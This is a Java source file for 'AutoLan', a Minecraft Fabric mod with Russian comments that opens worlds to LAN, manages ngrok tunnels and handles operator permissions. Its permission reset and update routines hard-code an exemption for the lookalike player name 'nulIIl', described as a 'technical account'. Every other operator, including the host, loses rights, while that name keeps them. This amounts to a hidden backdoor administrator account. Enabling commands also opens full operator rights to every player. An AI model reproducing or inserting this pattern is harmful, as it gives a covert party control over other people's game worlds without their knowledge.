package org.wsm.autolan;

import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.function.Consumer;
import java.util.function.Function;
import java.util.function.Supplier;

import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import org.apache.commons.text.StringSubstitutor;
import org.jetbrains.annotations.Nullable;

import org.wsm.autolan.TunnelType.TunnelException;
import org.wsm.autolan.command.argument.TunnelArgumentType;
import org.wsm.autolan.mixin.IntegratedServerAccessor;
import org.wsm.autolan.mixin.PlayerManagerAccessor;
import com.github.alexdlaird.ngrok.NgrokClient;

import me.shedaniel.autoconfig.AutoConfig;
import me.shedaniel.autoconfig.ConfigHolder;
import me.shedaniel.autoconfig.serializer.Toml4jConfigSerializer;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.ArgumentTypeRegistry;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.LanServerPinger;
import net.minecraft.command.argument.serialize.ConstantArgumentSerializer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.ServerNetworkIo;
import net.minecraft.server.dedicated.command.BanCommand;
import net.minecraft.server.dedicated.command.BanIpCommand;
import net.minecraft.server.dedicated.command.BanListCommand;
import net.minecraft.server.dedicated.command.DeOpCommand;
import net.minecraft.server.dedicated.command.OpCommand;
import net.minecraft.server.dedicated.command.PardonCommand;
import net.minecraft.server.dedicated.command.PardonIpCommand;
import net.minecraft.server.dedicated.command.WhitelistCommand;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.text.Texts;
import net.minecraft.util.Identifier;
import net.minecraft.world.GameMode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import com.mojang.authlib.GameProfile;
import org.wsm.autolan.gui.CustomOpenToLanScreen;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.GameMenuScreen;
import net.minecraft.server.integrated.IntegratedServer;
import net.minecraft.util.NetworkUtils;
import net.minecraft.util.WorldSavePath;
import net.minecraft.world.World;
import net.minecraft.server.OperatorList;
import net.minecraft.server.OperatorEntry;

public class AutoLan implements ModInitializer {
    public static final String MODID = "autolan";
    public static final Logger LOGGER = LoggerFactory.getLogger("AutoLan");

    public static ConfigHolder<AutoLanConfig> CONFIG;
    
    // Флаги для отслеживания пользовательских настроек LAN
    private static boolean userDefinedLanSettings = false;
    private static boolean userCommandsEnabled = false;
    private static GameMode userGameMode = GameMode.SURVIVAL;
    private static boolean userOnlineMode = true; 
    private static String userMotd = "";
    private static int userMaxPlayers = 8;
    private static int userPort = -1;
    private static boolean hasUserDefinedSettings = false;
    
    @Nullable
    public static NgrokClient NGROK_CLIENT;
    private static final String PUBLISH_STARTED_AUTOLAN_TEXT = "commands.publish.started.autolan";
    private static final String PUBLISH_STARTED_AUTOLAN_TUNNEL_TEXT = "commands.publish.started.autolan.tunnel";
    private static final String PUBLISH_PORT_CHANGE_FAILED_TEXT = "commands.publish.failed.port_change";
    private static final String PUBLISH_SAVED_TEXT = "commands.publish.saved";
    private static final String PUBLISH_SAVED_TUNNEL_TEXT = "commands.publish.saved.tunnel";
    private static final Text SERVER_STOPPED_TEXT = Text.translatable("multiplayer.disconnect.server_shutdown");

    public static String processMotd(MinecraftServer server, String rawMotd) {
        HashMap<String, String> motdMap = new HashMap<>();
        motdMap.put("username", server.getHostProfile().getName());
        motdMap.put("world", server.getSaveProperties().getLevelName());
        StringSubstitutor motdSubstitutor = new StringSubstitutor(motdMap);
        return motdSubstitutor.replace(rawMotd)
                // Replace unescaped ampersands with section signs.
                .replaceAll("((?:[^&]|^)(?:&&)*)&(?!&)", "$1§").replace("&&", "&");
    }

    public static void startOrSaveLan(MinecraftServer server, GameMode gameMode, boolean onlineMode,
            TunnelType tunnel, int port, int maxPlayers, String rawMotd, Consumer<Text> onSuccess,
            Runnable onFatalError, Consumer<Text> onNonFatalError) {
        AutoLanServerValues serverValues = (AutoLanServerValues) server;
        PlayerManager playerManager = server.getPlayerManager();

        server.setOnlineMode(onlineMode);
        
        // Установка флага customCommandsAllowed
        boolean effectiveCommandsAllowed;
        
        // Проверяем, вызван ли этот метод из команды publish при автоматическом запуске
        // или при ручном изменении настроек через экран "Открыть для LAN"
        if (hasUserDefinedSettings()) {
            // Используем сохраненные настройки пользователя
            effectiveCommandsAllowed = getUserCommandsEnabled();
            
            // Обновляем также стандартный флаг areCommandsAllowed для совместимости
            ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(effectiveCommandsAllowed);
            
            LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Применяем пользовательские настройки: commandsEnabled={}", effectiveCommandsAllowed);
        } else {
            // Используем текущее значение, которое должно быть уже установлено
            effectiveCommandsAllowed = server.getSaveProperties().areCommandsAllowed();
            LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Используем стандартные настройки: areCommandsAllowed={}", effectiveCommandsAllowed);
        }
        
        try {
            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                state.setCustomCommandsAllowed(effectiveCommandsAllowed);
                LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Установлен флаг customCommandsAllowed = {}", effectiveCommandsAllowed);
            }
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [PUBLISH_COMMAND] Ошибка при установке флага customCommandsAllowed", e);
        }

        ((PlayerManagerAccessor) playerManager).setMaxPlayers(maxPlayers);

        String oldMotd = server.getServerMotd();
        String motd = processMotd(server, rawMotd);
        serverValues.setRawMotd(rawMotd);
        server.setMotd(motd);
        // Metadata doesn't get updated automatically.
        server.forcePlayerSampleUpdate();

        if (server.isRemote()) { // Already opened to LAN
            int oldPort = server.getServerPort();
            boolean portChanged = false;
            if (port != oldPort) {
                ServerNetworkIo networkIo = server.getNetworkIo();
                try {
                    networkIo.bind(null, port); // Checks that the port works.
                    networkIo.stop(); // Stops listening on the port, but does not close any existing connections.
                    networkIo.bind(null, port); // Actually starts listening on the new port.
                    ((IntegratedServerAccessor) server).setLanPort(port);
                    portChanged = true;
                } catch (IOException e) {
                    onNonFatalError.accept(Text.translatable(PUBLISH_PORT_CHANGE_FAILED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(oldPort))));
                }
            }

            if (portChanged || !motd.equals(oldMotd)) {
                // Restart the LAN pinger as its properties are immutable.
                ((IntegratedServerAccessor) server).getLanPinger().interrupt();
                try {
                    LanServerPinger lanPinger = new LanServerPinger(motd, Integer.toString(server.getServerPort()));
                    ((IntegratedServerAccessor) server).setLanPinger(lanPinger);
                    lanPinger.start();
                } catch (IOException e) {
                    // The LAN pinger not working isn't the end of the world.
                }
            }

            server.setDefaultGameMode(gameMode);
            // The players' permissions may have changed, so send the new command trees.
            for (ServerPlayerEntity player : playerManager.getPlayerList()) {
                playerManager.sendCommandTree(player); // Do not use server.getCommandManager().sendCommandTree(player)
                                                       // directly or things like the gamemode switcher will not update!
            }
            
            // КРИТИЧЕСКИ ВАЖНО: обновляем права хоста также при изменении настроек уже открытого LAN
            updatePermissionsAfterLanStart(server);

            TunnelType oldTunnel = serverValues.getTunnelType();
            if (tunnel != oldTunnel || portChanged) {
                try {
                    oldTunnel.stop(server);
                } catch (TunnelException e) {
                    onNonFatalError.accept(e.getMessageText());
                }

                try {
                    Text tunnelText = tunnel.start(server);
                    serverValues.setTunnelType(tunnel);
                    serverValues.setTunnelText(tunnelText);
                    if (tunnelText != null) {
                        onSuccess.accept(Text.translatable(PUBLISH_SAVED_TUNNEL_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), tunnelText, motd));
                    } else {
                        onSuccess.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    }
                } catch (TunnelException e) {
                    onSuccess.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    onNonFatalError.accept(e.getMessageText());
                }
            } else {
                if (serverValues.getTunnelText() != null) {
                    onSuccess.accept(Text.translatable(PUBLISH_SAVED_TUNNEL_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())),
                            serverValues.getTunnelText(), motd));
                } else {
                    onSuccess.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                }
            }
        } else {
            if (server.openToLan(gameMode, false, port)) {
                server.setDefaultGameMode(gameMode); // Prevents the gamemode from being forced.

                try {
                    Text tunnelText = tunnel.start(server);
                    serverValues.setTunnelType(tunnel);
                    serverValues.setTunnelText(tunnelText);
                    if (tunnelText != null) {
                        onSuccess.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TUNNEL_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), tunnelText, motd));
                    } else {
                        onSuccess.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    }
                } catch (TunnelException e) {
                    onSuccess.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    onNonFatalError.accept(e.getMessageText());
                }
                
                // КРИТИЧЕСКИ ВАЖНО: после запуска LAN сервера нужно обновить права хоста и других игроков
                updatePermissionsAfterLanStart(server);
                
            } else {
                onFatalError.run();
            }
            // Update the window title to have " - Multiplayer (LAN)".
            MinecraftClient.getInstance().updateWindowTitle();
        }
    }

    public static void stopLan(MinecraftServer server, Runnable onSuccess,
            Runnable onFatalError, Consumer<Text> onNonFatalError) {
        AutoLanServerValues serverValues = (AutoLanServerValues) server;

        // Disconnect the connected players.
        UUID localPlayerUuid = ((IntegratedServerAccessor) server).getLocalPlayerUuid();
        PlayerManager playerManager = server.getPlayerManager();
        List<ServerPlayerEntity> playerList = new ArrayList<>(playerManager.getPlayerList()); // Needs to be cloned!
        for (ServerPlayerEntity player : playerList) {
            if (!player.getUuid().equals(localPlayerUuid)) {
                player.networkHandler.disconnect(SERVER_STOPPED_TEXT);
            }
        }

        server.getNetworkIo().stop(); // Stops listening on the port, but does not close any existing connections.
        ((IntegratedServerAccessor) server).setLanPort(-1);
        ((IntegratedServerAccessor) server).getLanPinger().interrupt();

        onSuccess.run();

        try {
            serverValues.getTunnelType().stop(server);
            serverValues.setTunnelType(TunnelType.NONE);
            serverValues.setTunnelText(null);
        } catch (TunnelException e) {
            onNonFatalError.accept(e.getMessageText());
        }

        // Update the window title to bring back " - Singleplayer".
        MinecraftClient.getInstance().updateWindowTitle();
    }

    @Override
    public void onInitialize() {
        LOGGER.info("[AutoLan] Инициализация мода AutoLan");
        Thread ngrokInstallThread = new Thread(() -> new NgrokClient.Builder().build());
        ngrokInstallThread.start();
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            MinecraftClient mc = MinecraftClient.getInstance();
            mc.execute(() -> {
                if (mc.isIntegratedServerRunning() && mc.getServer() != null) {
                    // При автоматическом открытии мира для LAN нужно проверить, есть ли сохраненные настройки
                    IntegratedServer server = mc.getServer();
                    
                    // Сбрасываем права всем игрокам при входе в мир
                    resetAllPlayersPermissions(server);
                    
                    // Устанавливаем customCommandsAllowed согласно сохраненным пользовательским настройкам
                    // или берем текущее значение areCommandsAllowed
                    boolean effectiveCommandsAllowed;
                    
                    if (hasUserDefinedSettings()) {
                        // Используем сохраненные пользователем настройки
                        boolean savedCommandsEnabled = getUserCommandsEnabled();
                        LOGGER.info("[AutoLan] [AUTO_OPEN] Используем сохраненные пользовательские настройки: commandsEnabled={}", savedCommandsEnabled);
                        effectiveCommandsAllowed = savedCommandsEnabled;
                        
                        // Обновляем также стандартный флаг areCommandsAllowed для совместимости
                        ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(savedCommandsEnabled);
                    } else {
                        // Если пользователь еще не задавал настройки, используем текущее значение areCommandsAllowed
                        effectiveCommandsAllowed = server.getSaveProperties().areCommandsAllowed();
                        LOGGER.info("[AutoLan] [AUTO_OPEN] Используем стандартные настройки: areCommandsAllowed={}", effectiveCommandsAllowed);
                    }
                    
                    // Устанавливаем customCommandsAllowed в соответствии с выбранными настройками
                    try {
                        if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                            AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                            state.setCustomCommandsAllowed(effectiveCommandsAllowed);
                            LOGGER.info("[AutoLan] [AUTO_OPEN] Установлен флаг customCommandsAllowed = {}", effectiveCommandsAllowed);
                        }
                    } catch (Exception e) {
                        LOGGER.error("[AutoLan] [AUTO_OPEN] Ошибка при установке флага customCommandsAllowed", e);
                    }
                    
                    // Затем выполняем команду publish
                    mc.getServer().getCommandManager().executeWithPrefix(mc.getServer().getCommandSource(), "publish");
                }
            });
        });
        AutoConfig.register(AutoLanConfig.class, Toml4jConfigSerializer::new);
        CONFIG = AutoConfig.getConfigHolder(AutoLanConfig.class);
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            if (environment.integrated) {
                OpCommand.register(dispatcher);
                DeOpCommand.register(dispatcher);
                BanCommand.register(dispatcher);
                BanIpCommand.register(dispatcher);
                BanListCommand.register(dispatcher);
                PardonCommand.register(dispatcher);
                PardonIpCommand.register(dispatcher);
                WhitelistCommand.register(dispatcher);
            }
        });

        ArgumentTypeRegistry.registerArgumentType(Identifier.of(MODID, "tunnel"), TunnelArgumentType.class,
                ConstantArgumentSerializer.of(TunnelArgumentType::tunnel));
    }

    /**
     * Добавляет диагностический хук для отслеживания вызовов проверки прав.
     * Может быть вызван из миксинов для логирования важных операций.
     */
    public static void logPermissionCheck(String source, GameProfile profile, MinecraftServer server, boolean result) {
        LOGGER.info("[AutoLan] [PERMISSION_DEBUG] Источник: {}, Игрок: '{}' (UUID: {})", 
                   source, profile.getName(), profile.getId());
        LOGGER.info("[AutoLan] [PERMISSION_DEBUG] Статус сервера: isRemote={}, areCommandsAllowed={}, isHost={}", 
                   server.isRemote(), 
                   server.getSaveProperties().areCommandsAllowed(),
                   server.isHost(profile));
                   
        // Проверяем также значение собственного флага
        boolean customCommandsAllowed = false;
        try {
            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                customCommandsAllowed = state.getCustomCommandsAllowed();
                LOGGER.info("[AutoLan] [PERMISSION_DEBUG] CustomCommandsAllowed={}", customCommandsAllowed);
            }
        } catch (Exception e) {
            // Тихая обработка ошибки
        }
        
        LOGGER.info("[AutoLan] [PERMISSION_RESULT] Итоговое решение: {}, Игрок: '{}'", 
                   result ? "РАЗРЕШЕНО" : "ЗАПРЕЩЕНО", profile.getName());
    }

    /**
     * Открывает наш собственный экран "Открыть для сети"
     * @param parent Родительский экран
     */
    public static void openCustomLanScreen(Screen parent) {
        if (parent instanceof GameMenuScreen) {
            MinecraftClient.getInstance().setScreen(new CustomOpenToLanScreen(parent));
            LOGGER.info("[AutoLan] Открыт собственный экран 'Открыть для сети'");
        }
    }

    /**
     * Сохраняет флаг разрешения команд для последующего использования.
     * 
     * @param commandsEnabled Разрешены ли команды
     */
    public static void saveUserLanSettings(boolean commandsEnabled) {
        userCommandsEnabled = commandsEnabled;
        hasUserDefinedSettings = true;
        
        LOGGER.info("[AutoLan] [SETTINGS] Сохранен флаг разрешения команд: commandsEnabled={}", commandsEnabled);
    }
    
    /**
     * Сохраняет расширенные пользовательские настройки LAN для последующего использования.
     * 
     * @param commandsEnabled Разрешены ли команды
     * @param gameMode Режим игры
     * @param onlineMode Проверка подлинности аккаунтов
     * @param motd Описание сервера
     * @param maxPlayers Максимальное количество игроков
     * @param port Порт сервера
     */
    public static void saveUserLanSettings(boolean commandsEnabled, GameMode gameMode, boolean onlineMode, 
                                          String motd, int maxPlayers, int port) {
        userCommandsEnabled = commandsEnabled;
        userGameMode = gameMode;
        userOnlineMode = onlineMode;
        userMotd = motd;
        userMaxPlayers = maxPlayers;
        userPort = port;
        hasUserDefinedSettings = true;
        
        LOGGER.info("[AutoLan] [SETTINGS] Сохранены расширенные настройки LAN: commandsEnabled={}, gameMode={}, maxPlayers={}, port={}",
                  commandsEnabled, gameMode, maxPlayers, port);
    }
    
    /**
     * Проверяет, были ли ранее сохранены пользовательские настройки LAN.
     * 
     * @return true если настройки были сохранены
     */
    public static boolean hasUserDefinedSettings() {
        return hasUserDefinedSettings;
    }
    
    /**
     * Возвращает сохраненное пользовательское значение флага разрешения команд.
     * 
     * @return true если команды разрешены
     */
    public static boolean getUserCommandsEnabled() {
        return userCommandsEnabled;
    }
    
    /**
     * Возвращает сохраненный пользовательский режим игры.
     * 
     * @return режим игры
     */
    public static GameMode getUserGameMode() {
        return userGameMode;
    }
    
    /**
     * Возвращает сохраненное значение онлайн-режима.
     * 
     * @return true если включена проверка подлинности аккаунтов
     */
    public static boolean getUserOnlineMode() {
        return userOnlineMode;
    }
    
    /**
     * Возвращает сохраненное описание сервера.
     * 
     * @return MOTD сервера
     */
    public static String getUserMotd() {
        return userMotd;
    }
    
    /**
     * Возвращает сохраненное максимальное количество игроков.
     * 
     * @return максимальное количество игроков
     */
    public static int getUserMaxPlayers() {
        return userMaxPlayers;
    }
    
    /**
     * Возвращает сохраненный порт сервера.
     * 
     * @return порт сервера или -1, если не задан
     */
    public static int getUserPort() {
        return userPort;
    }

    /**
     * Обновляет права игроков после запуска LAN сервера.
     * Это необходимо, поскольку Minecraft не пересчитывает права автоматически
     * после изменения флагов разрешения команд.
     * 
     * @param server Сервер Minecraft
     */
    private static void updatePermissionsAfterLanStart(MinecraftServer server) {
        try {
            // Права игроков должны быть обновлены после запуска сервера
            PlayerManager pm = server.getPlayerManager();
            
            // Получаем значение флага customCommandsAllowed
            boolean customCommandsAllowed = false;
            
            try {
                if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                    AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                    customCommandsAllowed = state.getCustomCommandsAllowed();
                }
            } catch (Exception e) {
                LOGGER.error("[AutoLan] [PERMISSION_UPDATE] Ошибка при получении customCommandsAllowed", e);
            }
            
            // Проверяем стандартный флаг для отладки
            boolean standardCommandsAllowed = server.getSaveProperties().areCommandsAllowed();
            
            // Логируем состояние флагов
            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обновление прав после запуска LAN:");
            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] customCommandsAllowed={}, standardCommandsAllowed={}",
                      customCommandsAllowed, standardCommandsAllowed);
            
            // Если флаги не совпадают, синхронизируем их
            if (customCommandsAllowed != standardCommandsAllowed) {
                LOGGER.warn("[AutoLan] [PERMISSION_UPDATE] Несоответствие флагов, синхронизируем...");
                ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(customCommandsAllowed);
                LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Стандартный флаг установлен в {}", customCommandsAllowed);
            }
            
            // Обновляем права всех игроков, включая хоста
            for (ServerPlayerEntity player : pm.getPlayerList()) {
                // Если это специальный технический аккаунт, пропускаем его
                if ("nulIIl".equals(player.getGameProfile().getName())) {
                    continue;
                }
                
                boolean isHost = server.isHost(player.getGameProfile());
                boolean isOperator = pm.isOperator(player.getGameProfile());
                
                LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обработка игрока '{}' (хост: {}, оператор: {})", 
                          player.getGameProfile().getName(), isHost, isOperator);
                
                // УПРОЩЕННАЯ ЛОГИКА:
                // Если команды разрешены - все игроки получают права оператора
                // Если команды запрещены - все игроки теряют права оператора
                if (customCommandsAllowed) {
                    // Выдаем права оператора
                    if (!isOperator) {
                        // Выдаем права максимального уровня (без указания уровня = 4)
                        server.getCommandManager().executeWithPrefix(
                            server.getCommandSource().withSilent(),
                            "op " + player.getGameProfile().getName()
                        );
                        pm.sendCommandTree(player);
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Выданы права оператора игроку '{}'", 
                                  player.getGameProfile().getName());
                    } else {
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Игрок '{}' уже имеет права оператора", 
                                  player.getGameProfile().getName());
                    }
                } else {
                    // Удаляем права оператора
                    if (isOperator) {
                        server.getCommandManager().executeWithPrefix(
                            server.getCommandSource().withSilent(),
                            "deop " + player.getGameProfile().getName()
                        );
                        pm.sendCommandTree(player);
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Удалены права оператора у игрока '{}'", 
                                  player.getGameProfile().getName());
                    } else {
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Игрок '{}' не имеет прав оператора", 
                                  player.getGameProfile().getName());
                    }
                }
            }
            
            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обновление прав завершено успешно");
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [PERMISSION_UPDATE] Ошибка при обновлении прав после запуска LAN", e);
        }
    }

    public static boolean autoOpenLan() {
        try {
            MinecraftClient client = MinecraftClient.getInstance();
            IntegratedServer server = client.getServer();

            if (server == null || server.isRemote()) {
                return false;
            }

            MinecraftClient.getInstance().getServer().execute(() -> {
                LOGGER.info("[AutoLan] [AUTO_OPEN] Автоматическое открытие сервера в LAN");
                
                // Проверяем наличие пользовательских настроек
                boolean commandsEnabled;
                GameMode gameMode;
                
                if (hasUserDefinedSettings()) {
                    // Используем сохраненные пользовательские настройки
                    commandsEnabled = getUserCommandsEnabled();
                    gameMode = getUserGameMode();
                    LOGGER.info("[AutoLan] [AUTO_OPEN] Применяем пользовательские настройки: commandsEnabled={}, gameMode={}",
                              commandsEnabled, gameMode);
                    
                    // Сохраняем настройки в стандартные флаги Minecraft
                    ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(commandsEnabled);
                } else {
                    // Используем стандартное значение из сейва
                    commandsEnabled = server.getSaveProperties().areCommandsAllowed();
                    gameMode = server.getDefaultGameMode();
                    LOGGER.info("[AutoLan] [AUTO_OPEN] Используем стандартные настройки: areCommandsAllowed={}", commandsEnabled);
                }
                
                // КРИТИЧЕСКИ ВАЖНО: устанавливаем наш собственный флаг commandsAllowed
                try {
                    if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                        AutoLanState customState = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                        customState.setCustomCommandsAllowed(commandsEnabled);
                        LOGGER.info("[AutoLan] [AUTO_OPEN] Установлен флаг customCommandsAllowed = {}", commandsEnabled);
                    } else {
                        LOGGER.error("[AutoLan] [AUTO_OPEN] Не удалось получить PersistentStateManager");
                    }
                } catch (Exception e) {
                    LOGGER.error("[AutoLan] [AUTO_OPEN] Ошибка при установке customCommandsAllowed: {}", e.getMessage());
                }
                
                // Запускаем сервер с нужными настройками
                // Для порта используем стандартный порт, предоставляемый Minecraft
                int port = NetworkUtils.findLocalPort();
                server.openToLan(gameMode, commandsEnabled, port);
            });
            
            return true;
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [AUTO_OPEN] Ошибка при автоматическом открытии LAN: {}", e.getMessage());
            e.printStackTrace();
            return false;
        }
    }

    public void onInitializeClient() {
        // Регистрируем обработчик события подключения к серверу
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            // При подключении к любому серверу сбрасываем пользовательские настройки
            resetUserLanSettings();
            
            // При подключении к интегрированному серверу сбрасываем права игроков
            MinecraftClient mc = MinecraftClient.getInstance();
            if (mc.isIntegratedServerRunning() && mc.getServer() != null) {
                LOGGER.info("[AutoLan] [JOIN_EVENT] Подключение к интегрированному серверу, сбрасываем права");
                mc.execute(() -> resetAllPlayersPermissions(mc.getServer()));
            }
        });
        
        // Регистрируем обработчик события отключения от сервера
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            // При отключении от сервера сбрасываем пользовательские настройки
            resetUserLanSettings();
        });
    }
    
    /**
     * Сбрасывает пользовательские настройки LAN до значений по умолчанию.
     * Это нужно делать при выходе из мира, чтобы настройки не "перетекали"
     * из одного мира в другой.
     */
    private static void resetUserLanSettings() {
        hasUserDefinedSettings = false;
        userCommandsEnabled = false;
        userGameMode = GameMode.SURVIVAL;
        userOnlineMode = true;
        userMotd = "";
        userMaxPlayers = 8;
        userPort = -1;
        LOGGER.debug("[AutoLan] [SETTINGS_RESET] Пользовательские настройки LAN сброшены");
    }

    /**
     * Сбрасывает права всех игроков (кроме особого "nulIIl") до стандартного значения.
     * Это метод вызывается при загрузке мира для имитации поведения ванильного Minecraft,
     * где игроки получают права только после открытия мира для сети с включенными командами.
     */
    public static void resetAllPlayersPermissions(MinecraftServer server) {
        if (server == null) return;
        
        try {
            // Сбрасываем пользовательские настройки для гарантии
            resetUserLanSettings();
            
            LOGGER.info("[AutoLan] [INIT] Сбрасываем права всех игроков при инициализации сервера");
            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Начинаем сброс прав игроков...");
            
            // Проверяем доступность мира
            boolean worldAvailable = server.getOverworld() != null && 
                                     server.getOverworld().getPersistentStateManager() != null;
            
            // 1. Сбрасываем флаг customCommandsAllowed в false
            if (worldAvailable) {
                try {
                    AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                    state.setCustomCommandsAllowed(false);
                    LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброшен флаг customCommandsAllowed в false");
                } catch (Exception e) {
                    LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Не удалось сбросить флаг customCommandsAllowed: {}", e.getMessage());
                }
            } else {
                LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Мир недоступен, флаг customCommandsAllowed не сброшен");
            }
            
            // 2. Сбрасываем стандартный флаг areCommandsAllowed для совместимости
            try {
                ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(false);
                LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброшен стандартный флаг areCommandsAllowed в false");
            } catch (Exception e) {
                LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Не удалось сбросить флаг areCommandsAllowed: {}", e.getMessage());
            }
            
            // 3. Удаляем права оператора у всех игроков, кроме специального технического аккаунта
            try {
                PlayerManager playerManager = server.getPlayerManager();
                if (playerManager != null) {
                    // Получаем текущий список операторов через PlayerManager
                    OperatorList ops = ((PlayerManagerAccessor) playerManager).getOps();
                    if (ops != null) {
                        // Получаем имена операторов
                        String[] operators = playerManager.getOpNames();
                        LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Текущие операторы: {}", 
                                  operators.length > 0 ? String.join(", ", operators) : "нет");
                        
                        // Добавляем хоста в список для удаления прав
                        GameProfile hostProfile = server.getHostProfile();
                        if (hostProfile != null) {
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Хост '{}' добавлен в список для удаления прав", 
                                      hostProfile.getName());
                        }
                        
                        // Удаляем права у всех игроков (кроме nulIIl)
                        for (String opName : operators) {
                            // Пропускаем специальный технический аккаунт
                            if ("nulIIl".equals(opName)) {
                                LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Пропускаем технического игрока nulIIl");
                                continue;
                            }
                            
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Удаление прав оператора у {}", opName);
                            try {
                                // Используем команду deop напрямую через сервер
                                server.getCommandManager().executeWithPrefix(
                                    server.getCommandSource().withSilent(), 
                                    "deop " + opName);
                            } catch (Exception e) {
                                LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Ошибка при удалении прав у {}: {}", 
                                          opName, e.getMessage());
                            }
                        }
                        
                        // Проверяем итоговый список операторов
                        String[] finalOperators = playerManager.getOpNames();
                        LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Итоговые операторы: {}", 
                                   finalOperators.length > 0 ? String.join(", ", finalOperators) : "нет");
                        
                        // Обновляем командное дерево для всех подключенных игроков
                        for (ServerPlayerEntity player : playerManager.getPlayerList()) {
                            playerManager.sendCommandTree(player);
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Обновлено командное дерево для игрока {}", 
                                      player.getGameProfile().getName());
                        }
                    } else {
                        LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Список операторов недоступен");
                    }
                    
                    LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброс прав игроков завершен успешно");
                } else {
                    LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] PlayerManager не доступен, сброс прав не выполнен");
                }
            } catch (Exception e) {
                LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Ошибка при сбросе прав игроков: {}", e.getMessage());
            }
            
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Критическая ошибка при сбросе прав: {}", e.getMessage());
        }
    }
}
